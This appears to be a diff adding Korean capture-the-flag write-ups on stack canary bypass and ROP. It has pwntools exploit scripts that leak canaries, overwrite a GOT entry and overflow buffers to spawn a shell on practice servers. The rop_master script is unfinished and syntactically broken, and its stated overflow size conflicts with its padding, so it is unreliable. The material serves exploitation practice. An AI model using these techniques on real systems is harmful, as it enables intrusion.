@@ -1,6 +1,76 @@
 # Canary & Stack pivoting & RTC
 
-[선택2]  
+
+## ssp_000
+
+read 함수가 실행되기 전에 rsi 레지스터를 보면 canary를 찾을 수 있으며, 80bytes를 bof하면 canary를 덮을 수 있다.
+bof를 이용해 canary를 변조하여 __stack_chk_fail 함수를 실행하도록 한다. __stack_chk_fail 이전에 입력받은 주소의 값을 변조하는 코드가 있으므로 이 부분에서 __stack_chk_fail 함수의 got를 get_shell의 주소로 덮어쓰면 쉘을 얻을 수 있다.
+
+```python
+
+from pwn import *
+
+#p = process("./ssp_000")
+p = remote("host1.dreamhack.games",10370)
+e = ELF("./ssp_000")
+
+get_shell = 0x4008ea
+
+p.sendline(b"A"*80)
+p.recvuntil("r : ")
+p.sendline(str(e.got['__stack_chk_fail']))
+p.recvuntil("e : ")
+p.sendline(str(get_shell))
+
+p.interactive()
+
+```
+
+
+## ssp_001
+
+스택의 구조를 살펴보면 box[64], name[64], canary[4] 순이다. 그러므로 box와 canary의 offset은 128임을 알 수 있다. 따라서 box에 129, 130, 131, 132를 입력하여 canary를 얻을 수 있다. 또한 name에서 bof를 일으켜 얻은 canary로 덮고 sfp와 dummy, ret을 덮으면 쉘을 얻을 수 있다.
+
+
+```python
+from pwn import *
+
+#p = process("./ssp_001")
+p = remote("host1.dreamhack.games",15771)
+e = ELF("./ssp_001")
+
+get_shell = e.symbols["get_shell"]
+
+p.recvuntil("> ")
+
+canary = "0x"
+for i in range(4):
+	p.sendline(b"P")
+	p.recvuntil(": ")
+	p.sendline(str(0x80+i))
+	p.recvuntil("is : ")
+	canary = p.recvuntil('\n')[:2] + canary
+  
+canary = int(canary, 16)
+
+payload = b"A"*64 
+payload += p32(canary)
+payload += b"B"*8
+payload += p32(get_shell) 
+
+
+p.sendline("E")
+p.recvuntil("Size : ")
+p.sendline(str(len(payload)))
+p.recvuntil("Name : ")
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+
+ 
 
 ## 1 csu_example
 
@@ -136,6 +206,38 @@ p.interactive()
 
 
 ## 3 rop_master
+
+rop 문제로, 0x16만큼의 bof가 난다.
+
+```python
+from pwn import *
+
+p = process('./rop_master')
+e = ELF('./rop_master')
+libc = e.libc
+
+
+read_plt = 0x400440 
+read_got = 0x601020
+write_plt = 0x400430
+write_got =  0x601018
+
+pop_rdi = 0x00400613
+
+p.send(b'/bin/sh')
+
+payload = b'A'*0x100
+payload += 
+
+
+
+
+p.send(payload)
+
+p.interactive()
+
+
+```
 
 
 
